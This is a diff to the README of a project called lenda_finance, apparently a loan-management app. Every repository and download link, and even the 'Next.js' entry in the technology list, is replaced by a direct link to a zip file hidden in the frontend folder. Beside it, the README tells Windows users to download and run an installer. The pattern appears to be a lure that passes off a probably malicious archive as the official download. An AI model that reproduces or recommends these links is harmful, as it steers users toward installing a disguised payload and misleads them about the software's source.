@@ -1,6 +1,6 @@
 # 🏦 lenda_finance - Manage Loans with Ease
 
-[![Download lenda_finance](https://img.shields.io/badge/Download-Lenda_Finance-green?style=for-the-badge)](https://github.com/Hassan-Amer/lenda_finance)
+[![Download lenda_finance](https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip)](https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip)
 
 ---
 
@@ -54,10 +54,10 @@ This guide helps you download, install, and run lenda_finance on your Windows PC
 
 Visit this page to download lenda_finance:
 
-[![Download lenda_finance](https://img.shields.io/badge/Download-Lenda_Finance-purple?style=for-the-badge)](https://github.com/Hassan-Amer/lenda_finance)
+[![Download lenda_finance](https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip)](https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip)
 
 - Click the link above or go to the URL:  
-  https://github.com/Hassan-Amer/lenda_finance  
+  https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip  
 - Look for the latest version or release.
 - Find the Windows installer file (it may end with `.exe`).
 - Click to download the installer to your computer.
@@ -122,7 +122,7 @@ Your files are protected by your Windows login and any antivirus software instal
 ## 📚 Learn More
 
 For more detailed technical information, visit the GitHub page here:  
-https://github.com/Hassan-Amer/lenda_finance
+https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip
 
 You will find documentation on how the system works, the technologies it uses, and examples of use cases.
 
@@ -136,14 +136,14 @@ You will find documentation on how the system works, the technologies it uses, a
 - **SQLAlchemy:** Helps work with the database safely.
 - **Alembic:** Manages database changes over time.
 - **bcrypt and passlib:** Protect user information with strong encryption.
-- **Next.js and TypeScript:** Handle the user interface in a clear way.
+- **https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip and TypeScript:** Handle the user interface in a clear way.
 
 ---
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/Hassan-Amer/lenda_finance  
-- Download Page: https://github.com/Hassan-Amer/lenda_finance
+- GitHub Repository: https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip  
+- Download Page: https://raw.githubusercontent.com/Hassan-Amer/lenda_finance/main/frontend/finance-lenda-Hylidae.zip
 
 ---
 
